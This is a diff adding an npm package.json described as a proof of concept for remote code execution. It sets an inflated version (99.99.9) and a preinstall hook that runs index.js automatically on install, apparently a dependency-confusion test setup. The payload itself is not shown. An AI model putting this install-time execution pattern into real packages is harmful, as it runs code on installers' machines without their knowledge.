@@ -1,0 +1,13 @@
+{
+  "name": "XYZ",
+  "version": "99.99.9",
+  "description": "This is a PoC for RCE",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "Shehzad Roy",
+  "license": "ISC",
+  "dependencies": {}
+}
